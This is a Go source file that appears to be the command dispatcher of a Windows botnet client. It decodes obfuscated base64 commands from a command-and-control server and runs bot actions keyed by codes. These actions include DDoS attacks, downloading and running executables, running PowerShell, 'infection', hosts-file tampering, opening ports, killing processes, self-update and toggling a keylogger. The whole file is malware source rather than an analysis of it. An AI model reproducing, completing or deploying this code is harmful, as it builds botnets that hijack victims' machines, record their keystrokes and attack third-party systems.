//Encode Data = Text -> Obfuscate -> Base64
//Decode Data = Deobfuscate -> Base64 -> Text
package components

import (
	"os"
	"strconv"
	"strings"
	"time"

	"golang.org/x/sys/windows/registry"
)

//Checks data's MD5 with the MD5 of LAST in registry, if the same it ingnores, if diffrent it decodeds the command and parces the commands information

func commandParce(data string) {
	val, _ := getRegistryKeyValue(registry.CURRENT_USER, "Software\\"+myInstallReg+"\\", "LAST")

	if md5Hash(data) != lastCommand { //See if old command
		if md5Hash(data) != val {

			NewDebugUpdate("Command HASH: " + md5Hash(data))
			NewDebugUpdate("Val Data: " + val)
			lastCommand = md5Hash(data)
			registryToy(data, 4)

			gettime := strings.Split(data, "||")

			then, err := time.Parse(time.RFC850, gettime[0])
			if err != nil {
				return
			}

			duration := time.Since(then)
			if duration.Hours() >= 24 {
				//NewDebugUpdate("Command to old, ingoring.")
			} else {
				decode := base64Decode(deobfuscate(gettime[1])) //Decodes the command
				tmp := strings.Split(decode, "|")               //parses the command information

				if tmp[0] == "000" || tmp[0] == myUID || strings.Contains(tmp[0], myUID) { //If all bots, just me, some bots and me
					didlastCommand = false
					if tmp[1] == "0x0" {
						os.Exit(0)
					} else if tmp[1] == "0x1" {
						if len(tmp) == 4 { //check to make sure the command is argumented right...
							openURL(tmp[2], tmp[3]) //4
						}
					} else if tmp[1] == "0x2" {
						if len(tmp) == 4 {
							startEXE(tmp[2], tmp[3])
						}
					} else if tmp[1] == "0x3" {
						if len(tmp) == 6 {
							i, _ := strconv.Atoi(tmp[4])
							i2, _ := strconv.Atoi(tmp[5])
							ddosAttc(tmp[2], tmp[3], i, i2)
						}
					} else if tmp[1] == "0x4" {
						setDDoSMode(false)
					} else if tmp[1] == "0x5" {
						downloadAndRun(tmp[2], tmp[3], tmp[4], tmp[5], tmp[6])
					} else if tmp[1] == "0x6" {
						if len(tmp) == 4 {
							runPowershell(tmp[2], tmp[3])
						}
					} else if tmp[1] == "0x7" {
						if len(tmp) == 3 {
							infection(tmp[2])
						}
					} else if tmp[1] == "0x8" {
						startServer()
					} else if tmp[1] == "0x9" {
						if len(tmp) == 4 {
							editPage(tmp[2], tmp[3])
						}
					} else if tmp[1] == "1x0" {
						if len(tmp) == 4 {
							hideProcWindow(tmp[2], tmp[3])
						}
					} else if tmp[1] == "1x1" {
						seedTorrent(tmp[2])
					} else if tmp[1] == "1x2" {
						if len(tmp) == 3 {
							powerOptions(tmp[2])
						}
					} else if tmp[1] == "1x3" {
						if len(tmp) == 3 {
							setHomepage(tmp[2])
						}
					} else if tmp[1] == "1x4" {
						if len(tmp) == 4 {
							setBackground(tmp[2], tmp[3])
						}
					} else if tmp[1] == "1x5" {
						if len(tmp) == 4 {
							if tmp[3] == "0" {
								editHost(tmp[2], false)
							} else {
								editHost(tmp[2], true)
							}
						}
					} else if tmp[1] == "1x6" {
						if len(tmp) == 3 {
							if tmp[2] == "yes" {
								uninstall()
							}
						}
					} else if tmp[1] == "1x7" {
						if len(tmp) == 3 {
							i3, _ := strconv.Atoi(tmp[2])
							_, _ = openPort(i3)
						}
					} else if tmp[1] == "1x8" {
						handleScripters(tmp[2], tmp[3])
					} else if tmp[1] == "1x9" {
						if len(tmp) == 3 {
							run(tmp[2])
						}
					} else if tmp[1] == "2x0" {
						if len(tmp) == 4 {
							ProxSrvLoad(tmp[2], tmp[3])
						}
					} else if tmp[1] == "2x1" {
						if len(tmp) == 6 {
							filePush(tmp[2], tmp[3], tmp[4], tmp[5])
						}
					} else if tmp[1] == "2x2" {
						kill(tmp[2])
					} else if tmp[1] == "2x3" {
						if len(tmp) == 5 {
							update(tmp[2], tmp[3], tmp[4])
						}
					} else if tmp[1] == "2x4" {
						if !isKeyLogging {
							setKeyLoggerMode(true)
							startLogger(0)
						} else {
							setKeyLoggerMode(false)
						}
					} else if tmp[1] == "refresh" {
						//Tell Bot to send updated information about itself to the C&C
					} else {
						//NewDebugUpdate("Unknown Command Received...")
					}
					didlastCommand = true
				} //check if gettime[0] = currentTime.Format(time.RFC850)
			}
		}
	}
}
